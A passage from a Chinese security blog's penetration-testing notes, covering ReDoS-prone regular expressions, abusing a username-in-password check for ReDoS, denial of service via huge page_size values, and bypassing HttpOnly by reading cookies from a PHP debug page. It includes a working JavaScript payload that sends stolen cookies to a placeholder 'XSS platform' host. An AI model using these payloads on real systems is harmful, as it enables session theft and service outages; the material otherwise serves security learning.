<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(a+)+</span><br><span class="line">([a-zA-Z]+)*</span><br><span class="line">(a|aa)+</span><br><span class="line">(a|a?)+</span><br><span class="line">(.*a)&#123;x&#125; for x &gt; 10</span><br></pre></td></tr></table></figure>
<h5 id="redos-恶意正则检测">ReDoS 恶意正则检测</h5>
<p>对于复杂的恶意正则表达式，靠人工去看难免有些许费劲，推荐一款工具：<a target="_blank" rel="noopener" href="https://github.com/superhuman/rxxr2/tree/fix-multiline">https://github.com/superhuman/rxxr2/tree/fix-multiline</a> (安装参考项目的<code>readme</code>)</p>
<p>该工具支持大批量的正则表达式检测，并给出检测结果。</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/28.png" alt="图片.png"></p>
<h5 id="实际场景">实际场景</h5>
<p>很庆幸的是大多Web脚本语言的正则引擎都为NFA，所以也很方便我们做一些Web层面的挖掘。</p>
<p>做测试的时候大家有没有发现过这样一个逻辑：<strong>密码中不能包含用户名</strong></p>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/29.png" alt="图片.png"></p>
<p>这是一个用户添加的功能，其校验是通过后端的，请求包如下</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index/userAdd</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>[host]</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="language-ini"><span class="attr">nickname</span>=xxx&amp;password=xxx&amp;...</span></span><br></pre></td></tr></table></figure>
<p>当<code>password</code>中包含<code>nickname</code>则提示<strong>密码中不能包含用户名</strong></p>
<p>利用Python简单还原一下后端逻辑：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys,re</span><br><span class="line">username = sys.argv[<span class="number">1</span>]</span><br><span class="line">password = sys.argv[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">regex = re.<span class="built_in">compile</span>(username)</span><br><span class="line"><span class="keyword">if</span> (regex.match(password)):</span><br><span class="line">    <span class="built_in">print</span> <span class="string">u&#x27;密码中不能包含用户名&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">u&#x27;用户添加成功&#x27;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/30.png" alt="图片.png"></p>
<p>这时候用户名是一个正则，密码是一个待匹配字符串，而这时候我们都可以进行控制，也就能构建恶意的正则的表达式和字符串进行ReDoS攻击。</p>
<p>恶意的正则表达式：<code>a(b|c+)+d</code><br>
字符串（我们要想让其陷入回溯模式就不能让其匹配到，所以使用<code>ac......cx</code>的格式即可）：<code>acccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccx</code></p>
<p>如下图所示ReDoS攻击成功：</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/31.png" alt="图片.png"></p>
<p>我们只需要以同样的方式替换原请求包中的参数值即可（<strong>前提是该功能没有限制字符串长度和特殊字符</strong>）～</p>
<p>还有更多应用场景等待去发现，这里就不过多赘述了～</p>
<h5 id="数据查询数量可控">数据查询数量可控</h5>
<p>想必如下这类接口大家都见多了吧：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">/api/getInfo?page=1&amp;page_size=10 ...</span><br><span class="line">/api/viewData?startTime=&amp;endTime=1591258015173 ... </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>而这类接口通常都是调用数据的，当一个系统数据量十分大（这也是拒绝服务的前提）的时候就需要分页功能去优化性能，那我们尝试将这个可控的数据查询量的参数数值进行修改会怎么样？比如<code>page_size=10000</code>，再去请求会发现服务器明显有返回延迟（大量数据的查询展示）：</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/Summarize/32.png" alt="图片.png"></p>
<p>那如果是<code>page_size=100000000000</code>呢？想象一下，从查询到数据格式的处理返回展示，要占用巨大的服务器资源，我们如果尝试去多次重放此类请求，服务器终究还是无法承受这样的“力量”，最后导致宕机…</p>
<p>时间参数<code>startTime</code>也是如此，我们可以置空或设为<code>0</code>让其查询数据的时间范围为最大…以此类推、举一反三。</p>
<h2 id="服务器开了http-only如何获取cookie">服务器开了HTTP-only如何获取cookie</h2>
<h4 id="什么是http-only">什么是http-only</h4>
<p>HttpOnly属性：</p>
<p>如果在Cookie中设置了”HttpOnly”属性，那么通过程序(JS脚本、Applet等)将无法读取到Cookie信息，这样能有效的防止XSS攻击。</p>
<h4 id="如何绕过防御呢？">如何绕过防御呢？</h4>
<p>我们可以利用框架的DEBUG模式来获取，比如说PHP、Django等等框架都会有测试页面，这里用PHP来演示，核心原理就是利用js去请求debug页面，然后用正则匹配cookie字段，然后把cookie发送到接收平台上</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">createXmlHttp</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>) &#123;</span><br><span class="line">       xmlHttp = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();               </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">       xmlHttp = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">getS</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Url</span> = <span class="string">&#x27;http://XXX.XXX.XXX.XX:8080/test.php&#x27;</span>;</span><br><span class="line">    <span class="title function_">createXmlHttp</span>();</span><br><span class="line">    xmlHttp.<span class="property">onreadystatechange</span> = writeS;</span><br><span class="line">    xmlHttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, <span class="title class_">Url</span>, <span class="literal">true</span>);</span><br><span class="line">    xmlHttp.<span class="title function_">send</span>(<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">writeS</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (xmlHttp.<span class="property">readyState</span> == <span class="number">4</span>) &#123;</span><br><span class="line">     <span class="keyword">var</span> x = xmlHttp.<span class="property">responseText</span>.<span class="title function_">match</span>(<span class="regexp">/&lt;td[^&lt;&gt;]+?&gt;_SERVER\[&quot;HTTP_COOKIE&quot;\]&lt;\/td&gt;&lt;td[^&lt;&gt;]+?&gt;([\w\W]+?)&lt;\/td&gt;/</span>);</span><br><span class="line">     <span class="keyword">if</span> (x)&#123;</span><br><span class="line">        <span class="keyword">var</span> url = <span class="string">&quot;http://XXX.XXX.XXX.XX:8888/?echo=&quot;</span> + x; <span class="comment">//x 是获取的cookie内容 url是xss平台</span></span><br><span class="line">        <span class="title function_">createXmlHttp</span>();</span><br><span class="line">        xmlHttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, url, <span class="literal">true</span>);</span><br><span class="line">        xmlHttp.<span class="title function_">send</span>(<span class="literal">null</span>);  </span><br><span class="line">       &#125;   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">getS</span>();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://www.ascotbe.com">ascotbe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://www.ascotbe.com/2019/09/05/KnowledgeNavigationFile/">https://www.ascotbe.com/2019/09/05/KnowledgeNavigationFile/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.ascotbe.com" target="_blank">ascotbe</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/XSS/">XSS</a><a class="post-meta__tags" href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">信息收集</a></div><div class="post_share"><div class="social-share" data-image="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/43.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2019/10/12/LinuxInstallJavaEnvironment/"><img class="prev-cover" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/12.jpg" onerror="onerror=null;src='/img/404.gif'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Linux安装java环境</div></div></a></div><div class="next-post pull-right"><a href="/2019/08/19/NetcatReboundShell/"><img class="next-cover" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/29.jpg" onerror="onerror=null;src='/img/404.gif'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Netcat反弹Shell详解</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/01/08/CrossSiteScripting/" title="从零开始编写XSS平台"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/120.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-01-08</div><div class="title">从零开始编写XSS平台</div></div></a></div><div><a href="/2020/07/23/InformationGathering/" title="信息收集总结"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/109.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-07-23</div><div class="title">信息收集总结</div></div></a></div><div><a href="/2019/08/12/LinuxStudyNotes/" title="Linux学习笔记"><img class="cover" src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/Ascotbe/Image/master/BlogCover/34.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2019-08-12</div><div class="title">Linux学习笔记</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="utterances-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "/img/loading.gif" data-lazy-src="/img/avatar.jpeg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ascotbe</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">71</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">72</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">25</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ascotbe"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:ascotbe@gmail.com" target="_blank" title=""><i class="fa fa-envelope"></i></a><a class="social-icon" href="https://steamcommunity.com/id/ascotbe" target="_blank" title=""><i class="iconfont icon-steam"></i></a><a class="social-icon" href="https://twitter.com/asc0t6e" target="_blank" title=""><i class="iconfont icon-twitter"></i></a><a class="social-icon" href="https://t.me/ascotbe" target="_blank" title=""><i class="iconfont icon-telegram"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title=""><i class="fa fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">所有文章都是本人学习笔记仅限交流探讨，禁止利用文章思路进行违法操作，否则与作者无关，如果您不同意请关闭本站<img src= "/img/loading.gif" data-lazy-src="/img/announcement2.gif" style="zoom:25%;" ></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9B%B8%E5%85%B3"><span class="toc-number">1.</span> <span class="toc-text">验证码相关</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%8B%E6%9C%BA%E7%9F%AD%E4%BF%A1%E6%8E%A5%E7%A0%81"><span class="toc-number">1.1.</span> <span class="toc-text">手机短信接码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AF%AD%E9%9F%B3%E9%AA%8C%E8%AF%81%E7%A0%81"><span class="toc-number">1.2.</span> <span class="toc-text">语音验证码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E6%89%93%E7%A0%81"><span class="toc-number">1.3.</span> <span class="toc-text">自动打码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%96%87%E7%AB%A0%E6%80%BB%E7%BB%93-%E6%8C%89%E7%B1%BB%E5%9E%8B%E5%88%86%E7%B1%BB"><span class="toc-number">2.</span> <span class="toc-text">渗透文章总结(按类型分类)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.1.</span> <span class="toc-text">SSRF漏洞</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">2.2.</span> <span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E5%B8%B8%E8%A7%84%E6%B3%A8%E5%85%A5"><span class="toc-number">2.3.</span> <span class="toc-text">SQL常规注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#header"><span class="toc-number">2.4.</span> <span class="toc-text">header</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#waf"><span class="toc-number">2.5.</span> <span class="toc-text">WAF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">2.6.</span> <span class="toc-text">内网渗透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%8E%E6%B8%97%E9%80%8F"><span class="toc-number">2.7.</span> <span class="toc-text">后渗透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E4%BA%AB%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99"><span class="toc-number">2.8.</span> <span class="toc-text">分享学习资料</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E5%BA%93%E6%B1%87%E6%80%BB"><span class="toc-number">3.</span> <span class="toc-text">工具库汇总</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%81%AB%E7%8B%90%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8F%92%E4%BB%B6"><span class="toc-number">3.1.</span> <span class="toc-text">火狐浏览器插件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%B7%E6%AD%8C%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8F%92"><span class="toc-number">3.2.</span> <span class="toc-text">谷歌浏览器插</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">3.3.</span> <span class="toc-text">内网渗透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#fuzz"><span class="toc-number">3.4.</span> <span class="toc-text">FUZZ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E9%A1%B5%E7%9B%B8%E5%85%B3%E5%B7%A5%E5%85%B7"><span class="toc-number">3.5.</span> <span class="toc-text">网页相关工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3"><span class="toc-number">3.6.</span> <span class="toc-text">漏洞相关</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%82%E9%A1%B9%E5%B7%A5%E5%85%B7"><span class="toc-number">3.7.</span> <span class="toc-text">杂项工具</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#burp"><span class="toc-number">3.8.</span> <span class="toc-text">Burp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A0%B4%E8%A7%A3%E5%8A%A0%E5%AF%86"><span class="toc-number">3.9.</span> <span class="toc-text">破解加密</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94"><span class="toc-number">4.</span> <span class="toc-text">应急响应</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#linux"><span class="toc-number">4.1.</span> <span class="toc-text">Linux</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#windows"><span class="toc-number">4.2.</span> <span class="toc-text">Windows</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E5%A7%BF%E5%8A%BF%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">渗透姿势总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">5.1.</span> <span class="toc-text">域名信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">5.2.</span> <span class="toc-text">敏感信息收集</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B4%AD%E7%89%A9%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E6%80%9D%E8%B7%AF"><span class="toc-number">5.3.</span> <span class="toc-text">购物漏洞挖掘思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#header%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="toc-number">5.4.</span> <span class="toc-text">Header头注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#host%E6%B3%A8%E5%85%A5"><span class="toc-number">5.4.0.1.</span> <span class="toc-text">HOST注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#xss"><span class="toc-number">5.4.0.2.</span> <span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#x-forwarded-for%E6%B3%A8%E5%85%A5"><span class="toc-number">5.4.0.3.</span> <span class="toc-text">X-Forwarded-For注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#user-agent%E6%B3%A8%E5%85%A5"><span class="toc-number">5.4.0.4.</span> <span class="toc-text">User-Agent注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9F%AD%E4%BF%A1%E8%BD%B0%E7%82%B8"><span class="toc-number">5.5.</span> <span class="toc-text">短信轰炸</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E5%90%8E%E5%8F%B0%E7%BB%95%E8%BF%87"><span class="toc-number">5.6.</span> <span class="toc-text">登录后台绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-number">5.6.0.1.</span> <span class="toc-text">利用万能密码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0-02-%E6%8A%93%E5%8F%96%E8%BF%94%E5%9B%9E%E5%8C%85%E7%BB%95%E8%BF%87"><span class="toc-number">5.6.0.2.</span> <span class="toc-text">0×02 抓取返回包绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">5.7.</span> <span class="toc-text">验证码绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#0x01-%E5%9B%BE%E7%89%87%E9%AA%8C%E8%AF%81"><span class="toc-number">5.7.0.1.</span> <span class="toc-text">0x01 图片验证</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x02-%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">5.7.0.2.</span> <span class="toc-text">0x02 参数绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x03-cookie%E7%BB%95%E8%BF%87"><span class="toc-number">5.7.0.3.</span> <span class="toc-text">0x03 Cookie绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x04-url%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-number">5.7.0.4.</span> <span class="toc-text">0x04 Url参数绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x05-%E8%BF%94%E5%9B%9E%E5%8C%85%E7%BB%95%E8%BF%87"><span class="toc-number">5.7.0.5.</span> <span class="toc-text">0x05 返回包绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x06-%E7%A9%BA%E9%AA%8C%E8%AF%81%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">5.7.0.6.</span> <span class="toc-text">0x06 空验证码绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#0x07-%E5%B8%B8%E8%A7%81%E7%9A%84%E6%80%9D%E8%B7%AF"><span class="toc-number">5.7.0.7.</span> <span class="toc-text">0x07 常见的思路</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E8%BF%87%E6%BB%A4%E4%B8%8B%E7%9A%84xss%E6%89%A7%E8%A1%8C"><span class="toc-number">5.8.</span> <span class="toc-text">无过滤下的XSS执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#scirpt"><span class="toc-number">5.8.1.</span> <span class="toc-text">&lt;scirpt&gt;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#img"><span class="toc-number">5.8.2.</span> <span class="toc-text">&lt;img&gt;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#input"><span class="toc-number">5.8.3.</span> <span class="toc-text">&lt;input&gt;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#details"><span class="toc-number">5.8.4.</span> <span class="toc-text">&lt;details&gt;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#svg"><span class="toc-number">5.8.5.</span> <span class="toc-text">&lt;svg&gt;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#select"><span class="toc-number">5.8.6.</span> <span class="toc-text">&lt;select&gt;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#iframe"><span class="toc-number">5.8.7.</span> <span class="toc-text">&lt;iframe&gt;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#video"><span class="toc-number">5.8.8.</span> <span class="toc-text">&lt;video&gt;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#audio"><span class="toc-number">5.8.9.</span> <span class="toc-text">&lt;audio&gt;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#body"><span class="toc-number">5.8.10.</span> <span class="toc-text">&lt;body&gt;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#textarea"><span class="toc-number">5.8.11.</span> <span class="toc-text">&lt;textarea&gt;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#keygen"><span class="toc-number">5.8.12.</span> <span class="toc-text">&lt;keygen&gt;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#marquee"><span class="toc-number">5.8.13.</span> <span class="toc-text">&lt;marquee&gt;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#isindex"><span class="toc-number">5.8.14.</span> <span class="toc-text">&lt;isindex&gt;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#link"><span class="toc-number">5.8.15.</span> <span class="toc-text">&lt;link&gt;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#javascript%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">5.8.16.</span> <span class="toc-text">JavaScript伪协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%87%E7%AD%BE%E5%86%85%E7%9A%84%E5%B1%9E%E6%80%A7"><span class="toc-number">5.8.17.</span> <span class="toc-text">标签内的属性</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E8%BF%87%E6%BB%A4%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8Bxss%E6%89%A7%E8%A1%8C"><span class="toc-number">5.9.</span> <span class="toc-text">有过滤的情况下XSS执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="toc-number">5.9.1.</span> <span class="toc-text">过滤空格</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">5.9.2.</span> <span class="toc-text">过滤关键字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4-%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">5.9.3.</span> <span class="toc-text">过滤&quot;关键字</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E6%8B%BC%E6%8E%A5"><span class="toc-number">5.9.4.</span> <span class="toc-text">字符拼接</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E5%AE%83%E5%AD%97%E7%AC%A6%E6%B7%B7%E6%B7%86"><span class="toc-number">5.9.5.</span> <span class="toc-text">其它字符混淆</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">5.9.6.</span> <span class="toc-text">编码绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%8F%8C%E5%BC%95%E5%8F%B7-%E5%8D%95%E5%BC%95%E5%8F%B7"><span class="toc-number">5.9.7.</span> <span class="toc-text">过滤双引号，单引号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4url%E5%9C%B0%E5%9D%80"><span class="toc-number">5.9.8.</span> <span class="toc-text">过滤url地址</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8url%E7%BC%96%E7%A0%81"><span class="toc-number">5.9.8.1.</span> <span class="toc-text">使用url编码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BD%BF%E7%94%A8ip"><span class="toc-number">5.9.8.2.</span> <span class="toc-text">使用IP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xml"><span class="toc-number">5.10.</span> <span class="toc-text">XML</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-number">5.10.1.</span> <span class="toc-text">账号密码爆破</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%B0%B7%E6%AD%8C%E8%AF%AD%E6%B3%95"><span class="toc-number">5.11.</span> <span class="toc-text">利用谷歌语法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#googlehack%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-number">5.11.1.</span> <span class="toc-text">googlehack基本语法</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%96%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA"><span class="toc-number">5.12.</span> <span class="toc-text">外网服务器搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#v2rav-%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">5.13.</span> <span class="toc-text">v2rav 客户端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%AE%BE%E7%BD%AE%E4%BB%A3%E7%90%86"><span class="toc-number">5.14.</span> <span class="toc-text">命令行设置代理</span></a></li><li class="toc-item 